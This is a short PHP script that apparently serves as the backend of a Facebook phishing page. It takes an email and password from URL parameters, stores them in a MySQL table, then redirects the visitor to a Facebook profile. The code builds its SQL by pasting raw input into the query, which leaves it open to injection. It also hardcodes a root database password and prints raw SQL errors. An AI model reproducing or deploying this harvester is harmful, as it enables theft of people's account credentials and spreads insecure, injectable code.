 <?php
$servername = "localhost:3306";
$username = "root";
$password = "Bijoy@0771";
$dbname = "use_pass";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$pass =$_GET["pass"];
$use=$_GET["email"];
$sql = "INSERT INTO user (user_name,pass_word)
VALUES ('$use','$pass')";

if ($conn->query($sql) === TRUE) {
    echo "";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?> 
<?php 
    echo "<script>location.href='https://m.facebook.com/arpita.chowdhury.980967';</script>";
?>